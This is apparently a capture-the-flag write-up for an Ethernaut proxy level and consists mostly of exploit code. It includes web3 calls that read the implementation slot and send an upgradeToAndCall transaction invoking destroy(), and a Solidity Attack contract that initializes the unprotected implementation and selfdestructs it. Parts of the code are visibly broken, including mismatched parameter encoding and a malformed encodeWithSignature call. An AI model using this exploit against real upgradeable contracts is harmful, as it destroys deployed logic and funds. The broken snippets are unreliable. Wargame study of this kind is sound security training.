## Description

```
const functionSignature = '_setImplementation(address)';
const parameters = [player];

const functionSelector = web3.eth.abi.encodeFunctionSignature(functionSignature);

const encodedParameters = web3.eth.abi.encodeParameters(['address', 'bytes'], parameters);

const callData = functionSelector + encodedParameters.slice(2);
await web3.eth.call({
to: contract.address,
data: callData
});
```
await web3.eth.getStorageAt(contract.address, "0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc");

```
let destroy = web3.eth.abi.encodeFunctionSignature("destroy()")
data2 = web3.eth.abi.encodeFunctionCall({ name: 'upgradeToAndCall', type: 'function', inputs: [{ type: 'address', name: 'newImplementation' },{ type: 'bytes', name: 'data' }]}, ["0x87ee3369064c79A065728c14882ad9020051B42f",destroy]);

await web3.eth.sendTransaction({from:player, to:"0x0719e1557ba3f89d5004c57871142e4ecf42ffd2", data:data2})
```

```
contract Attack {
    Engine public engine;

    function attack(address _engine)public {
        engine = Engine(_engine);
        engine.initialize();
        engine.upgradeToAndCall(address(this), abi.encodeWithSignature(this.destr.selector;));
    }

    function destr() public {
        selfdestruct(payable(0));
    }
}
```
It took a long time because after selfdestruct the contract restores bytecode. I went to read and realized that now it doesn't work.

Not nice that there is no last checkbox in ethernaut :)